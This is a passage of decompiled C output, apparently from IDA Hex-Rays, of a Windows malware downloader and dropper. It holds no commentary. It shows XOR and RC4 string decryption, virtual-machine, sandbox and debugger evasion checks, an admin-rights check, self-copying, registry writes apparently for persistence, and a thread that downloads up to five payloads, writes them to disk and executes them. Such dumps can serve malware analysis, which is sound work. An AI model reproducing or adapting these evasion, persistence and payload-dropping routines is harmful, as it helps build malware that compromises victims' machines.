    v7 = ((int (__stdcall *)(_DWORD, _BYTE *, int))v18)(0, v16, a2);
    if ( !v7 )
      break;
    v6 = ((int (__stdcall *)(_DWORD, int))v11)(0, v7);
    v4 = ((int (__stdcall *)(_DWORD, int))v14)(0, v7);
    if ( !v4 )
      break;
    v5 = ((int (__stdcall *)(int))v12)(v4);
    if ( !v5 )
      break;
    ek_memcpy(&v13[v17], v5, v6);
    v17 += v6;
    sub_4034C2(v16);
  }
  return v13;
}

//----- (00402007) --------------------------------------------------------
int __cdecl sub_402007(int a1)
{
  int result; // eax
  int v2; // [esp+4h] [ebp-Ch] BYREF
  int v3; // [esp+8h] [ebp-8h] BYREF
  LPVOID v4; // [esp+Ch] [ebp-4h]

  v3 = 0;
  v4 = sub_403591(0x438u);
  v2 = 1081;
  if ( a1 )
  {
    if ( !dword_406120(-2147483646, &unk_40514C, 0, 131097, &v3) )
    {
      if ( !dword_406124(v3, 0, 0, 0, v4, &v2) )
      {
        dword_406128(v3);
        return sub_403505((int)v4, asc_4054D8);
      }
      dword_406128(v3);
    }
    result = 0;
  }
  else
  {
    if ( !dword_406120(0x80000000, &unk_4052E4, 0, 983103, &v3) )
    {
      if ( !dword_406124(v3, 0, 0, 0, v4, &v2) )
      {
        dword_406128(v3);
        return sub_403505((int)v4, asc_4054DC);
      }
      dword_406128(v3);
    }
    result = 0;
  }
  return result;
}
// 406120: using guessed type int (__stdcall *dword_406120)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406124: using guessed type int (__stdcall *dword_406124)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406128: using guessed type int (__stdcall *dword_406128)(_DWORD);

//----- (00402105) --------------------------------------------------------
int sub_402105()
{
  int result; // eax
  const char *v1; // eax
  const char *v2; // eax
  const char *v3; // [esp+10h] [ebp-20h]
  const char *v4; // [esp+10h] [ebp-20h]
  char *v5; // [esp+14h] [ebp-1Ch]
  char *v6; // [esp+18h] [ebp-18h]
  FARPROC v7; // [esp+1Ch] [ebp-14h]
  int v8; // [esp+20h] [ebp-10h]
  char *v9; // [esp+24h] [ebp-Ch]
  char *v10; // [esp+28h] [ebp-8h]
  int v11; // [esp+2Ch] [ebp-4h]

  v7 = GetProcAddress(dword_406118, aT_0);
  result = sub_403505((int)byte_40570E, asc_4054E0);
  v3 = (const char *)result;
  if ( result )
  {
    v9 = (char *)sub_403591(0xAu);
    v5 = (char *)sub_403591(0xAu);
    v6 = (char *)sub_403591(0x28u);
    v10 = (char *)sub_403591(0xFFu);
    sub_40357C(v9, v3);
    v1 = (const char *)sub_403505(0, asc_4054E4);
    sub_40357C(v5, v1);
    v2 = (const char *)sub_403505(0, asc_4054E8);
    sub_40357C(v6, v2);
    v4 = (const char *)sub_403505(0, asc_4054EC);
    sub_40357C(v10, v4);
    v8 = sub_4035FF(v9);
    v11 = sub_4035FF(v5);
    result = ((int (__stdcall *)(_DWORD, char *, char *, int))v7)(0, v10, v6, v11 + v8);
  }
  return result;
}

//----- (0040224F) --------------------------------------------------------
int sub_40224F()
{
  int v0; // eax
  int result; // eax
  int v2; // eax
  int v3; // [esp+4h] [ebp-Ch] BYREF
  LPSTR lpString1; // [esp+8h] [ebp-8h]
  int v5; // [esp+Ch] [ebp-4h] BYREF

  if ( lstrcmpA(byte_405548, a0_1) )
  {
    if ( !dword_406104 || dword_405438 )
      dword_40612C(-2147483647, &unk_4052FC, &v5);
    else
      dword_40612C(-2147483646, &unk_4052FC, &v5);
    v0 = lstrlenA(lpString2);
    dword_406130(v5, byte_405548, 0, 1, lpString2, v0);
    result = dword_406128(v5);
  }
  else
  {
    result = lstrcmpA(byte_405571, a0_2);
    if ( result )
    {
      lpString1 = (LPSTR)sub_403591(0x105u);
      sub_40357C(lpString1, aJ76);
      lstrcatA(lpString1, byte_405571);
      if ( !dword_406104 || dword_405438 )
        dword_40612C(-2147483647, lpString1, &v3);
      else
        dword_40612C(-2147483646, lpString1, &v3);
      v2 = lstrlenA(lpString2);
      dword_406130(v3, &unk_405190, 0, 1, lpString2, v2);
      result = dword_406128(v3);
    }
  }
  return result;
}
// 405438: using guessed type int dword_405438;
// 406104: using guessed type int dword_406104;
// 406128: using guessed type int (__stdcall *dword_406128)(_DWORD);
// 40612C: using guessed type int (__stdcall *dword_40612C)(_DWORD, _DWORD, _DWORD);
// 406130: using guessed type int (__stdcall *dword_406130)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00402399) --------------------------------------------------------
LPCSTR __cdecl sub_402399(LPCSTR lpString1)
{
  LPCSTR result; // eax
  CHAR *v2; // eax
  CHAR *v3; // eax
  CHAR *v4; // eax
  CHAR *v5; // eax
  FARPROC v6; // [esp+0h] [ebp-Ch]
  FARPROC v7; // [esp+4h] [ebp-8h]
  FARPROC v8; // [esp+8h] [ebp-4h]

  v6 = GetProcAddress(dword_406108, aT_1);
  v8 = GetProcAddress(dword_406108, aZ_0);
  v7 = GetProcAddress(dword_406108, aJ_2);
  if ( lstrcmpA(byte_4055C1, a1_2) && lstrcmpA(byte_4055C1, a2_1) )
  {
    dword_406100 = 0;
    result = lpString1;
  }
  else
  {
    if ( !dword_406104 || dword_405438 )
    {
      v5 = sub_4034DC(aM53bv);
      sub_40357C((char *)lpString2, v5);
    }
    else if ( lstrcmpA(byte_4055C3, aN_0) )
    {
      if ( lstrcmpA(byte_4055C3, aJ_3) )
      {
        if ( lstrcmpA(byte_4055C3, asc_40536C) )
          v4 = sub_4034DC(aM53bv);
        else
          v4 = sub_4034DC(asc_405390);
        sub_40357C((char *)lpString2, v4);
      }
      else
      {
        v3 = sub_4034DC(aJ_5);
        sub_40357C((char *)lpString2, v3);
        lstrcatA((LPSTR)lpString2, aE);
      }
    }
    else
    {
      v2 = sub_4034DC(aJ_5);
      sub_40357C((char *)lpString2, v2);
    }
    lstrcatA((LPSTR)lpString2, asc_405500);
    lstrcatA((LPSTR)lpString2, byte_405598);
    if ( lstrcmpA(lpString1, lpString2) )
    {
      if ( lstrcmpA(byte_4055C1, a1_3) )
        ((void (__stdcall *)(LPCSTR, LPCSTR, _DWORD))v8)(lpString1, lpString2, 0);
      else
        ((void (__stdcall *)(LPCSTR, LPCSTR, int))v6)(lpString1, lpString2, 3);
      if ( !lstrcmpA(byte_4055C7, a1_4) )
        ((void (__stdcall *)(LPCSTR, int))v7)(lpString2, 2);
      if ( lstrcmpA(byte_40570E, a0_3) )
        sub_402105();
      sub_40224F();
      dword_406100 = 1;
      result = lpString2;
    }
    else
    {
      dword_406100 = 0;
      result = lpString1;
    }
  }
  return result;
}
// 405438: using guessed type int dword_405438;
// 406100: using guessed type int dword_406100;
// 406104: using guessed type int dword_406104;

//----- (004025EA) --------------------------------------------------------
BOOL sub_4025EA()
{
  BOOL result; // eax
  int v1; // [esp+4h] [ebp-10h] BYREF
  int v2; // [esp+8h] [ebp-Ch] BYREF
  int v3; // [esp+Ch] [ebp-8h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  v2 = 0;
  v1 = 4;
  v4 = dword_406120(-2147483646, &unk_4053F0, 0, 1, &v2);
  if ( v4 )
    return v4 == 5;
  if ( dword_406124(v2, &unk_40542C, 0, 0, &v3, &v1) )
  {
    dword_406128(v2);
    result = 0;
  }
  else
  {
    dword_406128(v2);
    result = v3 != 0;
  }
  return result;
}
// 406120: using guessed type int (__stdcall *dword_406120)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406124: using guessed type int (__stdcall *dword_406124)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406128: using guessed type int (__stdcall *dword_406128)(_DWORD);

//----- (00402684) --------------------------------------------------------
BOOL sub_402684()
{
  struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority; // [esp+0h] [ebp-10h] BYREF
  PSID pSid; // [esp+8h] [ebp-8h] BYREF
  BOOL IsMember; // [esp+Ch] [ebp-4h] BYREF

  pIdentifierAuthority.Value[0] = 0;
  pIdentifierAuthority.Value[1] = 0;
  pIdentifierAuthority.Value[2] = 0;
  pIdentifierAuthority.Value[3] = 0;
  pIdentifierAuthority.Value[4] = 0;
  pIdentifierAuthority.Value[5] = 5;
  if ( !AllocateAndInitializeSid(&pIdentifierAuthority, 2u, 0x20u, 0x220u, 0, 0, 0, 0, 0, 0, &pSid) )
    return 0;
  IsMember = 0;
  if ( !CheckTokenMembership(0, pSid, &IsMember) )
    IsMember = 0;
  FreeSid(pSid);
  return IsMember;
}

//----- (004026FF) --------------------------------------------------------
_BYTE *__cdecl sub_4026FF(int a1, _BYTE *a2, int a3)
{
  _BYTE *result; // eax
  int v4; // [esp+0h] [ebp-14h]
  char *v5; // [esp+4h] [ebp-10h]
  int v6; // [esp+8h] [ebp-Ch]
  char v7; // [esp+Ch] [ebp-8h]
  _BYTE *v8; // [esp+10h] [ebp-4h]
  char *i; // [esp+10h] [ebp-4h]

  if ( a3 >= 2 && a3 <= 16 )
  {
    v8 = a2;
    v6 = a1;
    do
    {
      v4 = v6 % a3;
      if ( v6 % a3 < 0 )
        v4 = -v4;
      *v8++ = byte_405510[v4];
      v6 /= a3;
    }
    while ( v6 );
    if ( a1 < 0 && a3 == 10 )
      *v8++ = 45;
    *v8 = 0;
    v5 = a2;
    for ( i = v8 - 1; v5 < i; --i )
    {
      v7 = *v5;
      *v5 = *i;
      *i = v7;
      ++v5;
    }
    result = a2;
  }
  else
  {
    *a2 = 0;
    result = a2;
  }
  return result;
}

//----- (004027D7) --------------------------------------------------------
BOOL sub_4027D7()
{
  return GetModuleHandleA(ModuleName)
      || GetModuleHandleA(aJ_4)
      || GetModuleHandleA(aX7vF2)
      || GetModuleHandleA(asc_4051C0)
      || GetModuleHandleA(aI);
}

//----- (00402830) --------------------------------------------------------
int sub_402830()
{
  __asm { vpcext  7, 0Bh }
  return 1;
}

//----- (004028A8) --------------------------------------------------------
int sub_4028A8()
{
  unsigned __int32 v0; // eax

  v0 = __indword(0x5658u);
  return 0;
}

//----- (00402930) --------------------------------------------------------
int sub_402930()
{
  int v1; // [esp+4h] [ebp-8h] BYREF
  int i; // [esp+8h] [ebp-4h]

  for ( i = 0; i < 5000000; ++i )
  {
    v1 = 14387;
    sub_4034C2(&v1);
  }
  return 0;
}

//----- (00402972) --------------------------------------------------------
BOOL sub_402972()
{
  HANDLE v0; // eax
  BOOL result; // eax
  FARPROC v2; // [esp+0h] [ebp-8h]
  int v3; // [esp+4h] [ebp-4h] BYREF

  v2 = GetProcAddress(dword_406110, aW_5);
  v3 = 0;
  v0 = GetCurrentProcess();
  ((void (__stdcall *)(HANDLE, int, int *, int, _DWORD))v2)(v0, 7, &v3, 4, 0);
  if ( v3 )
    result = 1;
  else
    result = IsDebuggerPresent();
  return result;
}

//----- (004029CB) --------------------------------------------------------
int __cdecl sub_4029CB(int a1, int a2)
{
  int result; // eax
  int i; // [esp+0h] [ebp-4h]

  for ( i = 0; i <= a2; ++i )
  {
    *(_BYTE *)(i + a1) ^= String[i % dword_4060F8];
    result = i + 1;
  }
  return result;
}
// 4060F8: using guessed type int dword_4060F8;

//----- (00402A0F) --------------------------------------------------------
int __cdecl sub_402A0F(int a1, int a2, unsigned int a3, unsigned int a4)
{
  int v5; // [esp+4h] [ebp-410h]
  unsigned int j; // [esp+8h] [ebp-40Ch]
  unsigned __int8 v7; // [esp+Ch] [ebp-408h]
  unsigned __int8 v8; // [esp+Ch] [ebp-408h]
  int v9[256]; // [esp+10h] [ebp-404h]
  int i; // [esp+410h] [ebp-4h]

  v5 = 0;
  for ( i = 0; i < 256; ++i )
    v9[i] = i;
  for ( i = 0; i < 256; ++i )
  {
    v5 = (*(unsigned __int8 *)(a2 + i % a4) + v9[i] + v5) % 256;
    v7 = v9[i];
    v9[i] = v9[v5];
    v9[v5] = v7;
  }
  for ( j = 0; j < a3; ++j )
  {
    i = (i + 1) % 256;
    v5 = (v9[i] + v5) % 256;
    v8 = v9[i];
    v9[i] = v9[v5];
    v9[v5] = v8;
    *(_BYTE *)(j + a1) ^= LOBYTE(v9[(v9[v5] + v9[i]) % 256]);
  }
  return a1;
}

//----- (00402BDF) --------------------------------------------------------
int sub_402BDF()
{
  sub_4029CB((int)aZ, 14);
  sub_4029CB((int)aW_0, 20);
  sub_4029CB((int)aW_1, 20);
  sub_4029CB((int)aW_2, 18);
  sub_4029CB((int)aW_3, 18);
  sub_4029CB((int)aW_4, 14);
  sub_4029CB((int)aO, 14);
  sub_4029CB((int)&byte_40510C, 13);
  sub_4029CB((int)aJ_1, 14);
  sub_4029CB((int)aU, 12);
  sub_4029CB((int)aU_0, 12);
  sub_4029CB((int)ProcName, 13);
  sub_4029CB((int)aK, 16);
  sub_4029CB((int)&unk_4052E4, 23);
  sub_4029CB((int)aK_1, 13);
  sub_4029CB((int)aK_2, 14);
  sub_4029CB((int)aK_0, 11);
  sub_4029CB((int)&unk_4052FC, 45);
  sub_4029CB((int)aJ76, 53);
  sub_4029CB((int)aJ_5, 10);
  sub_4029CB((int)aE, 9);
  sub_4029CB((int)aT_1, 11);
  sub_4029CB((int)aZ_0, 9);
  sub_4029CB((int)aJ_2, 18);
  sub_4029CB((int)aW_5, 25);
  sub_4029CB((int)aP, 13);
  sub_4029CB((int)aP_0, 16);
  sub_4029CB((int)aP_1, 16);
  sub_4029CB((int)aP_2, 19);
  sub_4029CB((int)LibFileName, 12);
  sub_4029CB((int)asc_40504C, 12);
  sub_4029CB((int)aW, 9);
  sub_4029CB((int)aN, 11);
  sub_4029CB((int)asc_405260, 10);
  sub_4029CB((int)&unk_4053A4, 8);
  sub_4029CB((int)&unk_4053DC, 16);
  sub_4029CB((int)aT_0, 11);
  sub_4029CB((int)aJ, 11);
  sub_4029CB((int)aJ_0, 13);
  sub_4029CB((int)aN_0, 3);
  sub_4029CB((int)aJ_3, 3);
  sub_4029CB((int)asc_40536C, 3);
  sub_4029CB((int)aT, 2);
  sub_4029CB((int)asc_405374, 2);
  sub_4029CB((int)aM53bv, 3);
  sub_4029CB((int)asc_405390, 7);
  sub_4029CB((int)&aM53bv[4], 4);
  sub_4029CB((int)&unk_4053F0, 57);
  sub_4029CB((int)&unk_40542C, 9);
  sub_4029CB((int)ModuleName, 11);
  sub_4029CB((int)aJ_4, 11);
  sub_4029CB((int)aX7vF2, 11);
  sub_4029CB((int)asc_4051C0, 13);
  sub_4029CB((int)aI, 11);
  sub_4029CB((int)&unk_40514C, 64);
  return sub_4029CB((int)&unk_405190, 8);
}

//----- (00402F2C) --------------------------------------------------------
HANDLE __usercall StartAddress@<eax>(int a1@<ebx>)
{
  HANDLE result; // eax
  CHAR *v2; // eax
  CHAR *v3; // eax
  CHAR *v4; // eax
  CHAR *v5; // eax
  HANDLE hFile; // [esp+8h] [ebp-34h]
  char *lpString1; // [esp+Ch] [ebp-30h]
  int j; // [esp+10h] [ebp-2Ch] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+14h] [ebp-28h] BYREF
  LPVOID v10; // [esp+18h] [ebp-24h]
  LPCVOID lpBuffer; // [esp+1Ch] [ebp-20h]
  int v12; // [esp+20h] [ebp-1Ch]
  int i; // [esp+24h] [ebp-18h]
  FARPROC v14; // [esp+28h] [ebp-14h]
  HANDLE v15; // [esp+2Ch] [ebp-10h]
  FARPROC v16; // [esp+30h] [ebp-Ch]
  FARPROC v17; // [esp+34h] [ebp-8h]
  FARPROC v18; // [esp+38h] [ebp-4h]

  v18 = GetProcAddress(dword_406114, aP);
  v17 = GetProcAddress(dword_406114, aP_0);
  v16 = GetProcAddress(dword_406114, aP_1);
  v14 = GetProcAddress(dword_406114, aP_2);
  result = (HANDLE)((int (__stdcall *)(_DWORD, int, _DWORD, _DWORD, _DWORD))v18)(0, 1, 0, 0, 0);
  v15 = result;
  if ( result )
  {
    for ( i = 0; i < 5; ++i )
    {
      result = (HANDLE)lstrcmpA(&byte_4058AC[424 * i], a0_4);
      if ( !result )
        return result;
      if ( dword_406100 || lstrcmpA(&byte_405A52[424 * i], a0_5) && lstrcmpA(&byte_405A52[424 * i], a1_5) )
      {
        v12 = ((int (__stdcall *)(HANDLE, CHAR *, _DWORD, _DWORD, _DWORD, _DWORD))v17)(
                v15,
                &byte_4058AC[424 * i],
                0,
                0,
                0,
                0);
        if ( !v12 )
          break;
        v10 = sub_403591(0x400u);
        lpBuffer = 0;
        nNumberOfBytesToWrite = 0;
        for ( j = 0; ; ek_memcpy((_BYTE *)lpBuffer + nNumberOfBytesToWrite - j, (int)v10, j) )
        {
          ((void (__stdcall *)(int, LPVOID, int, int *))v16)(v12, v10, 1023, &j);
          if ( !j )
            break;
          nNumberOfBytesToWrite += j;
          lpBuffer = sub_403410(a1, (int)lpBuffer, nNumberOfBytesToWrite, nNumberOfBytesToWrite - j);
        }
        if ( lstrcmpA((LPCSTR)&unk_405924 + 424 * i, aT) )
        {
          if ( lstrcmpA((LPCSTR)&unk_405924 + 424 * i, asc_405374) )
          {
            if ( lstrcmpiA((LPCSTR)&unk_405924 + 424 * i, aJ_3)
              && lstrcmpiA((LPCSTR)&unk_405924 + 424 * i, aN_0)
              && lstrcmpiA((LPCSTR)&unk_405924 + 424 * i, aM53bv)
              && lstrcmpiA((LPCSTR)&unk_405924 + 424 * i, asc_40536C) )
            {
              sub_401B1B(a1, (LPSTR)&unk_405924 + 424 * i, (int)lpBuffer, 0);
            }
            else
            {
              lpString1 = (char *)sub_403591(0x105u);
              if ( lstrcmpiA((LPCSTR)&unk_405924 + 424 * i, aJ_3) )
              {
                if ( lstrcmpiA((LPCSTR)&unk_405924 + 424 * i, aN_0) )
                {
                  if ( lstrcmpiA((LPCSTR)&unk_405924 + 424 * i, aM53bv) )
                  {
                    if ( !lstrcmpiA((LPCSTR)&unk_405924 + 424 * i, asc_40536C) )
                    {
                      v5 = sub_4034DC(asc_40536C);
                      sub_40357C(lpString1, v5);
                    }
                  }
                  else
                  {
                    v4 = sub_4034DC(aM53bv);
                    sub_40357C(lpString1, v4);
                  }
                }
                else
                {
                  v3 = sub_4034DC(aJ_5);
                  sub_40357C(lpString1, v3);
                }
              }
              else
              {
                v2 = sub_4034DC(aJ_5);
                sub_40357C(lpString1, v2);
                lstrcatA(lpString1, asc_405530);
                lstrcatA(lpString1, aE);
              }
              lstrcatA(lpString1, asc_405534);
              lstrcatA(lpString1, (LPCSTR)&unk_40594D + 424 * i);
              result = CreateFileA(lpString1, 0x40000000u, 0, 0, 2u, 0, 0);
              hFile = result;
              if ( result == (HANDLE)-1 )
                return result;
              WriteFile(result, lpBuffer, nNumberOfBytesToWrite, &nNumberOfBytesToWrite, 0);
              CloseHandle(hFile);
              if ( lstrcmpA(&byte_405A52[424 * i], a1_6) && lstrcmpA(&byte_405A52[424 * i], a3) )
                dword_406134(0, &aM53bv[4], lpString1, &unk_406140, 0, 0);
              else
                dword_406134(0, &aM53bv[4], lpString1, &unk_40613C, 0, 1);
            }
          }
          else
          {
            sub_401B1B(a1, dword_4060F4, (int)lpBuffer, 0);
          }
        }
        else
        {
          sub_401B1B(a1, ::lpString1, (int)lpBuffer, 0);
        }
      }
    }
    result = (HANDLE)((int (__stdcall *)(HANDLE))v14)(v15);
  }
  return result;
}
// 406100: using guessed type int dword_406100;
// 406134: using guessed type int (__stdcall *dword_406134)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00403410) --------------------------------------------------------
_BYTE *__usercall sub_403410@<eax>(int a1@<ebx>, int a2, SIZE_T dwBytes, int a4)
{
  _BYTE *v5; // [esp+Ch] [ebp-4h]

  if ( !a2 )
    return sub_403591(dwBytes);
  if ( a4 == dwBytes )
    return (_BYTE *)a2;
  v5 = sub_403591(dwBytes);
  if ( !v5 )
    return 0;
  if ( dwBytes <= a4 )
  {
    ek_memcpy(v5, a2, dwBytes);
  }
  else
  {
    ek_memcpy(v5, a2, a4);
    sub_4035AA(a1, &v5[a4], 0, dwBytes - a4);
  }
  sub_4034C2((LPVOID)a2);
  return v5;
}

//----- (004034C2) --------------------------------------------------------
BOOL __cdecl sub_4034C2(LPVOID lpMem)
{
  BOOL result; // eax

  if ( lpMem )
    result = HeapFree(hHeap, 0, lpMem);
  return result;
}

//----- (004034DC) --------------------------------------------------------
CHAR *__cdecl sub_4034DC(LPCSTR lpName)
{
  DWORD v1; // eax
  CHAR *result; // eax

  v1 = GetEnvironmentVariableA(lpName, Buffer, 0x400u);
  if ( v1 && v1 <= 0x400 )
    result = Buffer;
  else
    result = 0;
  return result;
}

//----- (00403505) --------------------------------------------------------
int __cdecl sub_403505(int a1, _BYTE *a2)
{
  int v2; // eax
  _BYTE *i; // edx
  _BYTE *v4; // esi
  char v5; // al
  _BYTE *v6; // ecx
  _BYTE *v7; // esi

  v2 = a1;
  if ( !a1 )
    v2 = dword_406548;
  for ( i = (_BYTE *)v2; *i; ++i )
  {
    v4 = a2;
    if ( *a2 )
    {
      v5 = *a2;
      do
      {
        if ( v5 == *i )
          break;
        v5 = *++v4;
      }
      while ( *v4 );
    }
    if ( !*v4 )
      break;
  }
  v6 = i;
  v7 = a2;
  if ( *i )
  {
    while ( *v6 != *v7 )
    {
      if ( !*++v7 )
      {
        v7 = a2;
        ++v6;
      }
      if ( !*v6 )
        goto LABEL_17;
    }
    *v6++ = 0;
  }
LABEL_17:
  dword_406548 = (int)v6;
  return v6 != i ? (unsigned int)i : 0;
}
// 406548: using guessed type int dword_406548;

//----- (0040357C) --------------------------------------------------------
char *__cdecl sub_40357C(char *a1, const char *a2)
{
  strcpy(a1, a2);
  return a1;
}

//----- (00403591) --------------------------------------------------------
LPVOID __cdecl sub_403591(SIZE_T dwBytes)
{
  SIZE_T v1; // eax

  v1 = dwBytes;
  if ( !dwBytes )
    v1 = 1;
  return HeapAlloc(hHeap, 0, v1);
}

//----- (004035AA) --------------------------------------------------------
char *__usercall sub_4035AA@<eax>(int a1@<ebx>, char *a2, char a3, unsigned int a4)
{
  int v4; // eax

  if ( a4 )
  {
    LOBYTE(a1) = a3;
    BYTE1(a1) = a3;
    v4 = a1 << 16;
    LOWORD(v4) = a1;
    memset32(a2, v4, a4 >> 2);
    memset(&a2[4 * (a4 >> 2)], a3, a4 & 3);
  }
  return a2;
}
// 4035AA: could not find valid save-restore pair for ebx

//----- (004035DD) --------------------------------------------------------
_BYTE *__cdecl ek_memcpy(_BYTE *a1, int a2, int a3)
{
  int v3; // esi
  _BYTE *v4; // ecx

  v3 = a3;
  if ( a3 )
  {
    v4 = a1;
    do
    {
      *v4 = v4[a2 - (_DWORD)a1];
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  return a1;
}

//----- (004035FF) --------------------------------------------------------
int __cdecl sub_4035FF(char *a1)
{
  return sub_4036FC(a1, 0, 0xAu);
}

//----- (00403610) --------------------------------------------------------
void __usercall __noreturn start(int a1@<ebx>)
{
  LPSTR v1; // esi
  unsigned __int8 v2; // cl
  CHAR v3; // al
  int v4; // eax
  HMODULE v5; // eax
  int v6; // eax
  int v7; // [esp-8h] [ebp-4Ch]
  struct _STARTUPINFOA StartupInfo; // [esp+0h] [ebp-44h] BYREF

  if ( dword_4065E4 && !dword_4065E4() )
    ExitProcess(0xFFFFFFFE);
  if ( sub_403804(off_40500C, (unsigned int)&unk_405014, 1) )
    ExitProcess(0xFFFFFFFD);
  sub_403804(off_405000, (unsigned int)&unk_405008, 0);
  v1 = GetCommandLineA();
  if ( !v1 )
    v1 = (LPSTR)&unk_4040C4;
  v2 = 32;
  while ( 1 )
  {
    if ( !*v1 )
      goto LABEL_20;
    if ( (unsigned __int8)*v1 > 0x20u )
      break;
    ++v1;
  }
  v3 = *v1;
  do
  {
    if ( v3 == 34 )
      v2 ^= 0x20u;
    v3 = *++v1;
  }
  while ( (unsigned __int8)*v1 > v2 );
LABEL_20:
  while ( *v1 && (unsigned __int8)*v1 <= v2 )
    ++v1;
  StartupInfo.dwFlags = 0;
  GetStartupInfoA(&StartupInfo);
  if ( (StartupInfo.dwFlags & 1) != 0 )
    v4 = StartupInfo.wShowWindow;
  else
    v4 = 10;
  v7 = v4;
  v5 = GetModuleHandleA(0);
  v6 = sub_40102C(a1, (int)v5, 0, v1, v7);
  sub_4037CF(v6);
}
// 4065E4: using guessed type int (*dword_4065E4)(void);

//----- (004036FC) --------------------------------------------------------
int __cdecl sub_4036FC(char *a1, char **a2, unsigned int a3)
{
  int v4; // esi
  BOOL v5; // edi
  char v6; // cl
  unsigned int v8; // edx
  char v9; // dl
  char v10; // cl
  unsigned int v11; // ecx
  unsigned int v12; // ecx

  v4 = 0;
  v5 = 0;
  while ( *a1 && (unsigned __int8)*a1 <= 0x20u )
    ++a1;
  v6 = *a1;
  if ( !*a1 )
  {
    if ( a2 )
      *a2 = a1;
    return 0;
  }
  if ( v6 == 43 || v6 == 45 )
  {
    ++a1;
    v5 = v6 == 45;
  }
  v8 = a3;
  if ( !a3 )
  {
    if ( *a1 != 48 )
    {
      v8 = 10;
      goto LABEL_33;
    }
    v9 = a1[1];
    if ( v9 != 120 && v9 != 88 )
    {
      v8 = 8;
      ++a1;
      goto LABEL_33;
    }
    v8 = 16;
    goto LABEL_23;
  }
  if ( a3 == 16 && *a1 == 48 )
  {
    v10 = a1[1];
    if ( v10 == 120 || v10 == 88 )
    {
LABEL_23:
      a1 += 2;
      goto LABEL_33;
    }
  }
LABEL_33:
  while ( 1 )
  {
    LOBYTE(v11) = *a1;
    if ( !*a1 )
      break;
    v11 = (unsigned __int8)v11;
    if ( (unsigned __int8)v11 >= 0x61u )
      v11 = (unsigned __int8)v11 - 32;
    if ( v11 < 0x41 )
    {
      if ( v11 < 0x30 || v11 > 0x39 )
        break;
      v12 = v11 - 48;
    }
    else
    {
      v12 = v11 - 55;
    }
    if ( v12 >= v8 )
      break;
    v4 = v12 + v8 * v4;
    ++a1;
  }
  if ( a2 )
    *a2 = a1;
  if ( v5 )
    v4 = -v4;
  return v4;
}

//----- (004037CF) --------------------------------------------------------
void __cdecl __noreturn sub_4037CF(UINT uExitCode)
{
  sub_40382B();
  sub_403804(&dword_405018, (unsigned int)&unk_40501C, 0);
  sub_403804(&dword_405020, (unsigned int)&unk_405024, 0);
  ExitProcess(uExitCode);
}

//----- (00403804) --------------------------------------------------------
int __cdecl sub_403804(int (**a1)(void), unsigned int a2, int a3)
{
  int result; // eax

  while ( (unsigned int)a1 < a2 )
  {
    if ( *a1 )
    {
      result = (*a1)();
      if ( a3 )
      {
        if ( result )
          return result;
      }
    }
    ++a1;
  }
  return 0;
}

//----- (0040382B) --------------------------------------------------------
int sub_40382B()
{
  int result; // eax

  while ( dword_40654C )
    result = ((int (*)(void))dword_406560[--dword_40654C])();
  return result;
}
// 40654C: using guessed type int dword_40654C;

// nfuncs=37 queued=35 decompiled=35 lumina nreq=0 worse=0 better=0
// ALL OK, 35 function(s) have been successfully decompiled
